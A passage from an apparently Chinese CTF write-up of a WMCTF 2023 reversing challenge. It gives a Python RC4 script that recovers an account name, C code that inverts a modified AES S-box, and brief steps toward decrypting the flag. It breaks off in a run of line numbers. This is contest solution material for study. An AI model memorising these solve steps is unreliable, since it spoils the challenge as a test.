</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span><span class=n>end</span><span class=o>=</span><span class=s2>&#34;,&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_main</span><span class=p>(</span><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;init_key&#34;</span><span class=p>,</span> <span class=n>message</span> <span class=o>=</span> <span class=s2>&#34;init_message&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;RC4解密主函数调用成功&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s_box</span> <span class=o>=</span> <span class=n>rc4_init_sbox</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>crypt</span> <span class=o>=</span> <span class=n>rc4_excrypt</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>s_box</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crypt</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_init_sbox</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s_box</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;原来的 s 盒：</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>s_box</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=n>s_box</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]))</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=n>s_box</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>s_box</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>s_box</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=n>s_box</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;混乱后的 s 盒：</span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span> <span class=n>s_box</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s_box</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_excrypt</span><span class=p>(</span><span class=n>plain</span><span class=p>,</span> <span class=n>box</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;调用解密程序成功。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>plain</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>plain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=n>box</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=n>box</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>box</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>box</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=n>box</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=n>box</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>box</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=n>box</span><span class=p>[</span><span class=n>t</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>+</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;res用于解密字符串，解密后是：</span><span class=si>%r</span><span class=s2>es&#34;</span> <span class=o>%</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;解密后的字符串是：</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;解密后的输出(没经过任何编码):&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=p>[</span><span class=mh>0xe9</span><span class=p>,</span><span class=mh>0x96</span><span class=p>,</span><span class=mh>0x66</span><span class=p>,</span><span class=mh>0xe5</span><span class=p>,</span><span class=mh>0x7a</span><span class=p>,</span><span class=mh>0xee</span><span class=p>,</span><span class=mh>0xbb</span><span class=p>,</span><span class=mh>0xc6</span><span class=p>,</span><span class=mh>0xa3</span><span class=p>,</span><span class=mh>0x4a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>key</span><span class=o>=</span><span class=s2>&#34;12345678&#34;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=nb>str</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)),</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rc4_main</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到账号，然后账号+123456作为key传入aes加密，这个加密魔改了sbox</p><p><img src=/img/2023-08-19Wmctf/20230821210708748.jpg alt=img></p><p>通过下面脚本求逆sbox</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdint.h&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>S_BOX</span><span class=p>[</span><span class=mi>16</span><span class=p>][</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x9C</span><span class=p>,</span> <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0xCA</span><span class=p>,</span> <span class=mh>0xE1</span><span class=p>,</span> <span class=mh>0xF8</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0xB0</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0xDE</span><span class=p>,</span> <span class=mh>0xF5</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x96</span><span class=p>,</span> <span class=mh>0xAD</span><span class=p>,</span> <span class=mh>0xC4</span><span class=p>,</span> <span class=mh>0xDB</span><span class=p>,</span> <span class=mh>0xF2</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0xAA</span><span class=p>,</span> <span class=mh>0xC1</span><span class=p>,</span> <span class=mh>0xD8</span><span class=p>,</span> <span class=mh>0xEF</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0xA7</span><span class=p>,</span> <span class=mh>0xBE</span><span class=p>,</span> <span class=mh>0xD5</span><span class=p>,</span> <span class=mh>0xEC</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x8D</span><span class=p>,</span> <span class=mh>0xA4</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0xD2</span><span class=p>,</span> <span class=mh>0xE9</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x8A</span><span class=p>,</span> <span class=mh>0xA1</span><span class=p>,</span> <span class=mh>0xB8</span><span class=p>,</span> <span class=mh>0xCF</span><span class=p>,</span> <span class=mh>0xE6</span><span class=p>,</span> <span class=mh>0xFD</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x9E</span><span class=p>,</span> <span class=mh>0xB5</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xE3</span><span class=p>,</span> <span class=mh>0xFA</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x9B</span><span class=p>,</span> <span class=mh>0xB2</span><span class=p>,</span> <span class=mh>0xC9</span><span class=p>,</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=mh>0xF7</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>,</span> <span class=mh>0xAF</span><span class=p>,</span> <span class=mh>0xC6</span><span class=p>,</span> <span class=mh>0xDD</span><span class=p>,</span> <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x95</span><span class=p>,</span> <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0xC3</span><span class=p>,</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=mh>0xF1</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x92</span><span class=p>,</span> <span class=mh>0xA9</span><span class=p>,</span> <span class=mh>0xC0</span><span class=p>,</span> <span class=mh>0xD7</span><span class=p>,</span> <span class=mh>0xEE</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0xA6</span><span class=p>,</span> <span class=mh>0xBD</span><span class=p>,</span> <span class=mh>0xD4</span><span class=p>,</span> <span class=mh>0xEB</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x8C</span><span class=p>,</span> <span class=mh>0xA3</span><span class=p>,</span> <span class=mh>0xBA</span><span class=p>,</span> <span class=mh>0xD1</span><span class=p>,</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x2D</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xA0</span><span class=p>,</span> <span class=mh>0xB7</span><span class=p>,</span> <span class=mh>0xCE</span><span class=p>,</span> <span class=mh>0xE5</span><span class=p>,</span> <span class=mh>0xFC</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0x9D</span><span class=p>,</span> <span class=mh>0xB4</span><span class=p>,</span> <span class=mh>0xCB</span><span class=p>,</span> <span class=mh>0xE2</span><span class=p>,</span> <span class=mh>0xF9</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0x9A</span><span class=p>,</span> <span class=mh>0xB1</span><span class=p>,</span> <span class=mh>0xC8</span><span class=p>,</span> <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0xF6</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x97</span><span class=p>,</span> <span class=mh>0xAE</span><span class=p>,</span> <span class=mh>0xC5</span><span class=p>,</span> <span class=mh>0xDC</span><span class=p>,</span> <span class=mh>0xF3</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x94</span><span class=p>,</span> <span class=mh>0xAB</span><span class=p>,</span> <span class=mh>0xC2</span><span class=p>,</span> <span class=mh>0xD9</span><span class=p>,</span> <span class=mh>0xF0</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0xA8</span><span class=p>,</span> <span class=mh>0xBF</span><span class=p>,</span> <span class=mh>0xD6</span><span class=p>,</span> <span class=mh>0xED</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0xA5</span><span class=p>,</span> <span class=mh>0xBC</span><span class=p>,</span> <span class=mh>0xD3</span><span class=p>,</span> <span class=mh>0xEA</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x8B</span><span class=p>,</span> <span class=mh>0xA2</span><span class=p>,</span> <span class=mh>0xB9</span><span class=p>,</span> <span class=mh>0xD0</span><span class=p>,</span> <span class=mh>0xE7</span><span class=p>,</span> <span class=mh>0xFE</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x2C</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x9F</span><span class=p>,</span> <span class=mh>0xB6</span><span class=p>,</span> <span class=mh>0xCD</span><span class=p>,</span> <span class=mh>0xE4</span><span class=p>,</span> <span class=mh>0xFB</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>Te_InvS</span><span class=p>[</span><span class=mi>16</span><span class=p>][</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>        <span class=o>//</span><span class=n>逆S盒缓存</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>Te_InVSAdd</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>            <span class=o>//</span><span class=n>位置</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>uint8_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>                    <span class=o>//</span><span class=n>计算逆S盒</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>uint8_t</span> <span class=n>n</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>n</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>n</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>Te_InVSAdd</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>S_BOX</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>n</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x0f</span><span class=p>;</span>        <span class=o>//</span><span class=n>取行</span>
</span></span><span class=line><span class=cl>            <span class=n>Te_InVSAdd</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>S_BOX</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>n</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x0f</span><span class=p>;</span>        <span class=o>//</span><span class=n>取列</span>
</span></span><span class=line><span class=cl>            <span class=n>Te_InvS</span><span class=p>[</span><span class=n>Te_InVSAdd</span><span class=p>[</span><span class=mi>0</span><span class=p>]][</span><span class=n>Te_InVSAdd</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=n>n</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>;</span>        <span class=o>//</span><span class=n>置值</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>ii</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>ii</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>ii</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>,&#34;</span><span class=p>,</span><span class=n>Te_InvS</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>ii</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>得到逆sbox，然后拿aes解密就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
